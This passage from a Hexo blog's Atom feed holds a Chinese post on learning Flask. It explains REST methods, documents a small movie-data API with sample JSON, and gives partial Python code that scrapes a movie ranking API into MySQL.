<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>haorical的博客</title>
  
  <subtitle>一分耕耘，一分收获</subtitle>
  <link href="http://blog.haorical.top/atom.xml" rel="self"/>
  
  <link href="http://blog.haorical.top/"/>
  <updated>2022-01-26T15:54:49.705Z</updated>
  <id>http://blog.haorical.top/</id>
  
  <author>
    <name>Haorical</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>flask学习</title>
    <link href="http://blog.haorical.top/posts/134f4b48/"/>
    <id>http://blog.haorical.top/posts/134f4b48/</id>
    <published>2022-01-26T15:23:56.000Z</published>
    <updated>2022-01-26T15:54:49.705Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>之前域名<a href="https://haorical.xyz/">https://haorical.xyz</a>过期了，只买了一年有点后悔了，续费太贵了，只能重新买了4年的<a href="https://haorical.top/">https://haorical.top</a>，二级域名<a href="https://blog.haorical.xyz/">https://blog.haorical.xyz</a>用来当博客地址</p></blockquote><h2 id="浅谈REST风格"><a href="#浅谈REST风格" class="headerlink" title="浅谈REST风格"></a>浅谈REST风格</h2><p>REST 全称是Representational State Transfer，中文意思是表现层状态转化。</p><p>简而言之，利用不同http请求方法来完成相关操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET 表示获取资源</span><br><span class="line">POST 表示新增资源</span><br><span class="line">PUT 表示修改资源</span><br><span class="line">DELETE 表示删除资源</span><br></pre></td></tr></table></figure><p>再利用url来表示操作对象</p><p>类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">获取所有用户列表：GET &#x2F;users</span><br><span class="line">获取用户a的详情：GET &#x2F;users&#x2F;a</span><br><span class="line">新增用户：POST &#x2F;users</span><br><span class="line">修改用户a的信息：PUT &#x2F;users&#x2F;a</span><br><span class="line">删除用户a：DELETE &#x2F;users&#x2F;a</span><br></pre></td></tr></table></figure><p><strong>我感觉是另一种方式的所见即所得，喜闻乐见</strong></p><span id="more"></span><h2 id="一个flask的小型项目，涉及mysql"><a href="#一个flask的小型项目，涉及mysql" class="headerlink" title="一个flask的小型项目，涉及mysql"></a>一个flask的小型项目，涉及mysql</h2><blockquote><p>自我感觉写的跟屎一样</p></blockquote><h3 id="api文档"><a href="#api文档" class="headerlink" title="api文档"></a>api文档</h3><h4 id="爬取指定网址并创建数据库"><a href="#爬取指定网址并创建数据库" class="headerlink" title="爬取指定网址并创建数据库"></a>爬取指定网址并创建数据库</h4><h5 id="接口功能"><a href="#接口功能" class="headerlink" title="接口功能"></a>接口功能</h5><blockquote><p>爬取指定网址并创建数据库</p></blockquote><h5 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h5><blockquote><p><a href="http://127.0.0.1:5000/create"> http://127.0.0.1:5000/create</a></p></blockquote><h5 id="HTTP请求方式"><a href="#HTTP请求方式" class="headerlink" title="HTTP请求方式"></a>HTTP请求方式</h5><blockquote><p>GET</p></blockquote><h5 id="返回字段"><a href="#返回字段" class="headerlink" title="返回字段"></a>返回字段</h5><blockquote><table><thead><tr><th align="left">返回字段</th><th align="left">字段类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">mes</td><td align="left">string</td><td align="left">返回结果状态。creat database OK: 正常</td></tr></tbody></table></blockquote><h5 id="接口示例"><a href="#接口示例" class="headerlink" title="接口示例"></a>接口示例</h5><blockquote><p>地址：<a href="http://127.0.0.1:5000/create](http://127.0.0.1:5000/create)">http://127.0.0.1:5000/create](http://127.0.0.1:5000/create)</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;mes&quot;</span>: <span class="string">&quot;creat database OK&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="展示数据库所有数据"><a href="#展示数据库所有数据" class="headerlink" title="展示数据库所有数据"></a>展示数据库所有数据</h4><h5 id="接口功能-1"><a href="#接口功能-1" class="headerlink" title="接口功能"></a>接口功能</h5><blockquote><p>展示数据库所有数据</p></blockquote><h5 id="URL-1"><a href="#URL-1" class="headerlink" title="URL"></a>URL</h5><blockquote><p><a href="http://127.0.0.1:5000/show">http://127.0.0.1:5000/show</a></p></blockquote><h5 id="支持格式"><a href="#支持格式" class="headerlink" title="支持格式"></a>支持格式</h5><blockquote><p>JSON</p></blockquote><h5 id="HTTP请求方式-1"><a href="#HTTP请求方式-1" class="headerlink" title="HTTP请求方式"></a>HTTP请求方式</h5><blockquote><p>GET</p></blockquote><h5 id="返回字段-1"><a href="#返回字段-1" class="headerlink" title="返回字段"></a>返回字段</h5><p>一个包含若干一下json的列表</p><blockquote><table><thead><tr><th align="left">返回字段</th><th align="left">字段类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">data</td><td align="left">json</td><td align="left">主要数据</td></tr><tr><td align="left">createdAt</td><td align="left">string</td><td align="left">所属公司名</td></tr><tr><td align="left">updatedAt</td><td align="left">string</td><td align="left">所属类型</td></tr><tr><td align="left">……..</td><td align="left">string</td><td align="left">……….</td></tr></tbody></table></blockquote><p>应该是豆瓣的数据，一些我也不知道是什么api。。。</p><h5 id="接口示例-1"><a href="#接口示例-1" class="headerlink" title="接口示例"></a>接口示例</h5><blockquote><p>地址：<a href="http://127.0.0.1:5000/show">http://127.0.0.1:5000/show</a></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">[&#123;</span><br><span class="line">  <span class="attr">&quot;data&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;createdAt&quot;</span>: <span class="string">&quot;1605355459692&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;updatedAt&quot;</span>: <span class="string">&quot;1605355459692&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;5f968bfcee3680299115bbe6&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;poster&quot;</span>: <span class="string">&quot;https://wmdb.querydata.org/movie/poster/1603701754760-c50d8a.jpg&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;肖申克的救赎&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;genre&quot;</span>: <span class="string">&quot;犯罪/剧情&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;20世纪40年代末，小有成就的青年银行家安迪（蒂姆·罗宾斯 Tim Robbins 饰）因涉嫌杀害妻子及她的情人而锒铛入狱。在这座名为鲨堡的监狱内，希望似乎虚无缥缈，终身监禁的惩罚无疑注定了安迪接下来...&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;language&quot;</span>: <span class="string">&quot;英语&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;country&quot;</span>: <span class="string">&quot;美国&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;lang&quot;</span>: <span class="string">&quot;Cn&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;shareImage&quot;</span>: <span class="string">&quot;https://wmdb.querydata.org/movie/poster/1605355459683-5f968bfaee3680299115bb97.png&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;movie&quot;</span>: <span class="string">&quot;5f968bfaee3680299115bb97&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;createdAt&quot;</span>: <span class="string">&quot;1603701756481&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;updatedAt&quot;</span>: <span class="string">&quot;1603701756481&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;5f968bfaee3680299115bb97&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;originalName&quot;</span>: <span class="string">&quot;The Shawshank Redemption&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;imdbVotes&quot;</span>: <span class="number">2297852</span>,</span><br><span class="line">  <span class="attr">&quot;imdbRating&quot;</span>: <span class="number">9.3</span>,</span><br><span class="line">  <span class="attr">&quot;rottenRating&quot;</span>: <span class="number">91</span>,</span><br><span class="line">  <span class="attr">&quot;rottenVotes&quot;</span>: <span class="number">75</span>,</span><br><span class="line">  <span class="attr">&quot;year&quot;</span>: <span class="number">1994</span>,</span><br><span class="line">  <span class="attr">&quot;imdbId&quot;</span>: <span class="string">&quot;tt0111161&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;alias&quot;</span>: <span class="string">&quot;月黑高飞(港) / 刺激1995(台) / 地狱诺言 / 铁窗岁月 / 消香克的救赎&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;doubanId&quot;</span>: <span class="number">1292052</span>,</span><br><span class="line">  <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;Movie&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;doubanRating&quot;</span>: <span class="number">9.7</span>,</span><br><span class="line">  <span class="attr">&quot;doubanVotes&quot;</span>: <span class="number">2170679</span>,</span><br><span class="line">  <span class="attr">&quot;duration&quot;</span>: <span class="number">8520</span>,</span><br><span class="line">  <span class="attr">&quot;dateReleased&quot;</span>: <span class="string">&quot;1994-09-10&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line">...............,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="查询相关数据"><a href="#查询相关数据" class="headerlink" title="查询相关数据"></a>查询相关数据</h4><h5 id="接口功能-2"><a href="#接口功能-2" class="headerlink" title="接口功能"></a>接口功能</h5><blockquote><p>根据id查找数据</p></blockquote><h5 id="URL-2"><a href="#URL-2" class="headerlink" title="URL"></a>URL</h5><blockquote><p><a href="http://127.0.0.1:5000/query/#id"> http://127.0.0.1:5000/query/#id</a></p></blockquote><h5 id="HTTP请求方式-2"><a href="#HTTP请求方式-2" class="headerlink" title="HTTP请求方式"></a>HTTP请求方式</h5><blockquote><p>GET</p></blockquote><h5 id="返回字段-2"><a href="#返回字段-2" class="headerlink" title="返回字段"></a>返回字段</h5><p>与查询全部数据库数据返回json相同</p><h5 id="接口示例-2"><a href="#接口示例-2" class="headerlink" title="接口示例"></a>接口示例</h5><blockquote><p>地址：<a href="http://127.0.0.1:5000/query/1](http://127.0.0.1:5000/query/1)">http://127.0.0.1:5000/query/1](http://127.0.0.1:5000/query/1)</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;createdAt&quot;</span>: <span class="string">&quot;1605355459692&quot;</span>,</span><br><span class="line">        <span class="string">&quot;updatedAt&quot;</span>: <span class="string">&quot;1605355459692&quot;</span>,</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: <span class="string">&quot;5f968bfcee3680299115bbe6&quot;</span>,</span><br><span class="line">        <span class="string">&quot;poster&quot;</span>: <span class="string">&quot;https://wmdb.querydata.org/movie/poster/1603701754760-c50d8a.jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;肖申克的救赎&quot;</span>,</span><br><span class="line">        <span class="string">&quot;genre&quot;</span>: <span class="string">&quot;犯罪/剧情&quot;</span>,</span><br><span class="line">        <span class="string">&quot;description&quot;</span>: <span class="string">&quot;20世纪40年代末，小有成就的青年银行家安迪（蒂姆·罗宾斯 Tim Robbins 饰）因涉嫌杀害妻子及她的情人而锒铛入狱。在这座名为鲨堡的监狱内，希望似乎虚无缥缈，终身监禁的惩罚无疑注定了安迪接下来...&quot;</span>,</span><br><span class="line">        <span class="string">&quot;language&quot;</span>: <span class="string">&quot;英语&quot;</span>,</span><br><span class="line">        <span class="string">&quot;country&quot;</span>: <span class="string">&quot;美国&quot;</span>,</span><br><span class="line">        <span class="string">&quot;lang&quot;</span>: <span class="string">&quot;Cn&quot;</span>,</span><br><span class="line">        <span class="string">&quot;shareImage&quot;</span>: <span class="string">&quot;https://wmdb.querydata.org/movie/poster/1605355459683-5f968bfaee3680299115bb97.png&quot;</span>,</span><br><span class="line">        <span class="string">&quot;movie&quot;</span>: <span class="string">&quot;5f968bfaee3680299115bb97&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;createdAt&quot;</span>: <span class="string">&quot;1603701756481&quot;</span>,</span><br><span class="line">    <span class="string">&quot;updatedAt&quot;</span>: <span class="string">&quot;1603701756481&quot;</span>,</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;5f968bfaee3680299115bb97&quot;</span>,</span><br><span class="line">    <span class="string">&quot;originalName&quot;</span>: <span class="string">&quot;The Shawshank Redemption&quot;</span>,</span><br><span class="line">    <span class="string">&quot;imdbVotes&quot;</span>: <span class="number">2297852</span>,</span><br><span class="line">    <span class="string">&quot;imdbRating&quot;</span>: <span class="number">9.3</span>,</span><br><span class="line">    <span class="string">&quot;rottenRating&quot;</span>: <span class="number">91</span>,</span><br><span class="line">    <span class="string">&quot;rottenVotes&quot;</span>: <span class="number">75</span>,</span><br><span class="line">    <span class="string">&quot;year&quot;</span>: <span class="number">1994</span>,</span><br><span class="line">    <span class="string">&quot;imdbId&quot;</span>: <span class="string">&quot;tt0111161&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alias&quot;</span>: <span class="string">&quot;月黑高飞(港) / 刺激1995(台) / 地狱诺言 / 铁窗岁月 / 消香克的救赎&quot;</span>,</span><br><span class="line">    <span class="string">&quot;doubanId&quot;</span>: <span class="number">1292052</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Movie&quot;</span>,</span><br><span class="line">    <span class="string">&quot;doubanRating&quot;</span>: <span class="number">9.7</span>,</span><br><span class="line">    <span class="string">&quot;doubanVotes&quot;</span>: <span class="number">2170679</span>,</span><br><span class="line">    <span class="string">&quot;duration&quot;</span>: <span class="number">8520</span>,</span><br><span class="line">    <span class="string">&quot;dateReleased&quot;</span>: <span class="string">&quot;1994-09-10&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="清空数据库"><a href="#清空数据库" class="headerlink" title="清空数据库"></a>清空数据库</h4><h5 id="接口功能-3"><a href="#接口功能-3" class="headerlink" title="接口功能"></a>接口功能</h5><blockquote><p>清空数据库</p></blockquote><h5 id="URL-3"><a href="#URL-3" class="headerlink" title="URL"></a>URL</h5><blockquote><p><a href="http://127.0.0.1:5000/clear"> http://127.0.0.1:5000/clear</a></p></blockquote><h5 id="HTTP请求方式-3"><a href="#HTTP请求方式-3" class="headerlink" title="HTTP请求方式"></a>HTTP请求方式</h5><blockquote><p>DELETE</p></blockquote><h5 id="返回字段-3"><a href="#返回字段-3" class="headerlink" title="返回字段"></a>返回字段</h5><blockquote><table><thead><tr><th align="left">返回字段</th><th align="left">字段类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">mes</td><td align="left">string</td><td align="left">返回结果状态。OK: 清空</td></tr></tbody></table></blockquote><h5 id="接口示例-3"><a href="#接口示例-3" class="headerlink" title="接口示例"></a>接口示例</h5><blockquote><p>地址：<a href="http://127.0.0.1:5000/clear](http://127.0.0.1:5000/clear)">http://127.0.0.1:5000/clear](http://127.0.0.1:5000/clear)</a></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;mes&quot;</span>: <span class="string">&quot;OK&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;./data/tmp.json&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = <span class="string">&#x27;mysql://root:123456@localhost:3307/flask&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    test_data = json.load(f)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Data</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    __tablename__ = <span class="string">&#x27;datas&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    createdAt = db.Column(db.String(<span class="number">32</span>))</span><br><span class="line">    updatedAt = db.Column(db.String(<span class="number">32</span>))</span><br><span class="line">    data_id = db.Column(db.String(<span class="number">32</span>))</span><br><span class="line">    poster = db.Column(db.String(<span class="number">64</span>))</span><br><span class="line">    name = db.Column(db.String(<span class="number">32</span>))</span><br><span class="line">    genre = db.Column(db.String(<span class="number">32</span>))</span><br><span class="line">    description = db.Column(db.String(<span class="number">128</span>))</span><br><span class="line">    language = db.Column(db.String(<span class="number">32</span>))</span><br><span class="line">    country = db.Column(db.String(<span class="number">32</span>))</span><br><span class="line">    lang = db.Column(db.String(<span class="number">16</span>))</span><br><span class="line">    shareImage = db.Column(db.String(<span class="number">128</span>))</span><br><span class="line">    movie = db.Column(db.String(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Detail</span>(<span class="params">db.Model</span>):</span></span><br><span class="line">    __tablename__ = <span class="string">&#x27;details&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    createdAt = db.Column(db.String(<span class="number">32</span>))</span><br><span class="line">    updatedAt = db.Column(db.String(<span class="number">32</span>))</span><br><span class="line">    detail_id = db.Column(db.String(<span class="number">32</span>))</span><br><span class="line">    originalName = db.Column(db.String(<span class="number">128</span>))</span><br><span class="line">    imdbVotes = db.Column(db.Integer)</span><br><span class="line">    imdbRating = db.Column(db.Float)</span><br><span class="line">    rottenRating = db.Column(db.Integer)</span><br><span class="line">    rottenVotes = db.Column(db.Integer)</span><br><span class="line">    year = db.Column(db.Integer)</span><br><span class="line">    imdbId = db.Column(db.String(<span class="number">16</span>))</span><br><span class="line">    alias = db.Column(db.String(<span class="number">256</span>))</span><br><span class="line">    doubanId = db.Column(db.Integer)</span><br><span class="line">    <span class="built_in">type</span> = db.Column(db.String(<span class="number">16</span>))</span><br><span class="line">    doubanRating = db.Column(db.Float)</span><br><span class="line">    doubanVotes = db.Column(db.Integer)</span><br><span class="line">    duration = db.Column(db.Integer)</span><br><span class="line">    dateReleased = db.Column(db.Date)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">    _data = requests.get(url=<span class="string">&#x27;https://api.wmdb.tv/api/v1/top?type=Imdb&amp;skip=0&amp;limit=100&amp;lang=Cn&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> _data.json()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat_db</span>(<span class="params">_data</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> _data:</span><br><span class="line">        x = i[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sm = x[<span class="string">&#x27;shareImage&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            sm = <span class="literal">None</span></span><br><span class="line">        da = Data(createdAt=x[<span class="string">&#x27;createdAt&#x27;</span>],</span><br><span class="line">                  updatedAt=x[<span class="string">&#x27;createdAt&#x27;</span>],</span><br><span class="line">                  data_id=x[<span class="string">&#x27;id&#x27;</span>],</span><br><span class="line">                  poster=x[<span class="string">&#x27;poster&#x27;</span>],</span><br><span class="line">                  name=x[<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line">                  genre=x[<span class="string">&#x27;genre&#x27;</span>],</span><br><span class="line">                  description=x[<span class="string">&#x27;description&#x27;</span>],</span><br><span class="line">                  language=x[<span class="string">&#x27;language&#x27;</span>],</span><br><span class="line">                  country=x[<span class="string">&#x27;country&#x27;</span>],</span><br><span class="line">                  lang=x[<span class="string">&#x27;lang&#x27;</span>],</span><br><span class="line">                  shareImage=sm,</span><br><span class="line">                  movie=x[<span class="string">&#x27;movie&#x27;</span>])</span><br><span class="line">        db.session.add(da)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            al = i[<span class="string">&#x27;alias&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            al = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            rR = i[<span class="string">&#x27;rottenRating&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            rR = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            rV = i[<span class="string">&#x27;rottenVotes&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            rV = <span class="literal">None</span></span><br><span class="line">        de = Detail(createdAt=i[<span class="string">&#x27;createdAt&#x27;</span>],</span><br><span class="line">                    updatedAt=i[<span class="string">&#x27;createdAt&#x27;</span>],</span><br><span class="line">                    detail_id=i[<span class="string">&#x27;id&#x27;</span>],</span><br><span class="line">                    originalName=i[<span class="string">&#x27;originalName&#x27;</span>],</span><br><span class="line">                    imdbVotes=i[<span class="string">&#x27;imdbVotes&#x27;</span>],</span><br><span class="line">                    imdbRating=i[<span class="string">&#x27;imdbRating&#x27;</span>],</span><br><span class="line">                    rottenRating=rR,</span><br><span class="line">                    rottenVotes=rV,</span><br><span class="line">                    year=i[<span class="string">&#x27;year&#x27;</span>],</span><br><span class="line">                    imdbId=i[<span class="string">&#x27;imdbId&#x27;</span>],</span><br><span class="line">                    alias=al,</span><br><span class="line">                    doubanId=i[<span class="string">&#x27;doubanId&#x27;</span>],</span><br><span class="line">                    <span class="built_in">type</span>=i[<span class="string">&#x27;type&#x27;</span>],</span><br><span class="line">                    doubanRating=i[<span class="string">&#x27;doubanRating&#x27;</span>],</span><br><span class="line">                    doubanVotes=i[<span class="string">&#x27;doubanVotes&#x27;</span>],</span><br><span class="line">                    duration=i[<span class="string">&#x27;duration&#x27;</span>],</span><br><span class="line">                    